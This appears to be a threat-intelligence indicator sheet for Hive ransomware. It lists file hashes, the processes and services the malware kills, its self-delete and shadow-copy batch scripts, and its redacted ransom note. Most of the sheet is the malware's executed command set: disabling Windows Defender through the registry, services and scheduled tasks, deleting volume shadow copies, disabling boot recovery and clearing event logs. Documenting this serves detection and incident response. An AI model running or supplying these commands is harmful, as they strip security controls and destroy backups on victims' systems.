# IOCs

* **SHA256**
```text
321d0c4f1bbb44c53cd02186107a18b7a44c840a9a5f0a78bdac06868136b72c
1e21c8e27a97de1796ca47a9613477cf7aec335a783469c5ca3a09d4f07db0ff
3a402af7a583471187bf9fc7872560aaacf5e3d8c99ca5404c3f157c06fba454
b214c1bbcc7b0c2a4a47134d6009594a4d30bd7d5e363a41603de6b5b8de18ca
```

# 32-bit

* **Default Process to Kill**
```text
mspub
msdesktop
```

* **Default Services to Stop**
```text
mspub
msdesktop
```

* **hive.bat**
```text
:Repeat
timeout 1 || sleep 1
del "C:\hive_x86.exe"
if exist "C:\hive_x86.exe" goto Repeat
del "hive.bat"
```

* **shadow.bat**
```text
vssadmin.exe delete shadows /all /quiet
del shadow.bat
```

# 64-bit

* **Default Process to Kill**
```text
agntsvc
CNTAoSMgr
dbeng50
dbsnmp
encsvc
excel
firefoxconfig
infopath
mbamtray
msaccess
mspub
mydesktop
Ntrtscan
ocautoupds
ocomm
ocssd
onenote
oracle
outlook
PccNTMon
powerpnt
sqbcoreservice
sql
steam
synctime
tbirdconfig
thebat
thunderbird
tmlisten
visio
word
xfssvccon
zoolz
```

* **Default Services to Stop**
```text
^svc
acronis
AcrSch2Svc
Antivirus
ARSM
AVP
backup
bedbg
CAARCUpdateSvc
CASAD2DWebSvc
ccEvtMgr
ccSetMgr
Culserver
dbeng8
dbsrv12
DCAgent
DefWatch
EhttpSrv
ekrn
Enterprise Client Service
EPSecurityService
EPUpdateService
EraserSvc11710
EsgShKernel
ESHASRV
FA_Scheduler
firebird
IISAdmin
IMAP4Svc
Intuit
KAVFS
KAVFSGT
kavfsslp
klnagent
LanmanWorkstation
macmnsvc
masvc
MBAMService
MBEndpointAgent
McAfee
McShield
McTaskManager
memtas
mepocs
mfefire 
mfemms
mfevtp
MMS
MsDtsServer
MsDtsServer100
MsDtsServer110
msexchange
msmdsrv
MSOLAP
MVArmor
MVarmor64
NetMsmqActivator
ntrtscan
oracle
PDVFSService
POP3Svc
postgres
QBCFMonitorService
QBFCService
QBIDPService
redis
report
RESvc
RTVscan
sacsvr
SamSs
SAVAdminService
SavRoam
SAVService
SDRSVC
SepMasterService
ShMonitor
Smcinst
SmcService
SMTPSvc
SNAC
SntpService
sophos
sql
SstpSvc
stc_raw_agent
swi_
Symantec
TmCCSF
tmlisten
tomcat
TrueKey
UI0Detect
veeam
vmware
vss
W3Svc
wbengine
WebClient
wrapper
WRSVC
WSBExchange
YooIT
zhudongfangyu
Zoolz
```

* **Executed Commands**
```text
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All 
cmd.exe /c powershell Set-MpPreference -DisableIOAVProtection $true
cmd.exe /c powershell Set-MpPreference -DisableRealtimeMonitoring $true
net.exe stop "LanmanWorkstation" /y
net.exe stop "QEMU Guest Agent VSS Provider" /y
net.exe stop "SamSs" /y
net.exe stop "SDRSVC" /y
net.exe stop "SstpSvc" /y
net.exe stop "UnistoreSvc_2ce02" /y
net.exe stop "vmicvss" /y
net.exe stop "VSS" /y
net.exe stop "wbengine" /y
net.exe stop "WebClient" /y
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
reg.exe delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
reg.exe delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP"    
reg.exe delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
reg.exe delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
sc.exe config "LanmanWorkstation" start= disabled
sc.exe config "QEMU Guest Agent VSS Provider" start= disabled
sc.exe config "SamSs" start= disabled
sc.exe config "SDRSVC" start= disabled
sc.exe config "SstpSvc" start= disabled
sc.exe config "UnistoreSvc_2ce02" start= disabled
sc.exe config "vmicvss" start= disabled
sc.exe config "VSS" start= disabled
sc.exe config "wbengine" start= disabled
sc.exe config "WebClient" start= disabled
schtasks.exe /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks.exe /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks.exe /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks.exe /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks.exe /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
vssadmin.exe delete shadows /all /quiet
wevtutil.exe cl application
wevtutil.exe cl security 
wevtutil.exe cl system
wmic.exe SHADOWCOPY /nointeractive
wmic.exe shadowcopy delete
```

* **Ransom Note**
```text
Your network has been breached and all data were encrypted.
Personal data, financial reports and important documents are ready to disclose.

To decrypt all the data or to prevent exfiltrated files to be disclosed at 
http://hiveleak<REDACTED>yd.onion/ 
you will need to purchase our decryption software.

Please contact our sales department at:

   http://hivec<REDACTED>.onion/
  
      Login:    <REDACTED>
      Password: <REDACTED>

To get access to .onion websites download and install Tor Browser at:
   https://www.torproject.org/ (Tor Browser is not related to us)


Follow the guidelines below to avoid losing your data:

 - Do not shutdown or reboot your computers, unmount external storages.
 - Do not try to decrypt data using third party software. It may cause 
   irreversible damage.
 - Do not fool yourself. Encryption has perfect secrecy and it's impossible 
   to decrypt without knowing the key.
 - Do not modify, rename or delete *.key.k6thw files. Your 
   data will be undecryptable.
 - Do not modify or rename encrypted files. You will lose them.
 - Do not report to authorities. The negotiation process will be terminated 
   immediately and the key will be erased.
 - Do not reject to purchase. Your sensitive data will be publicly disclosed.
```
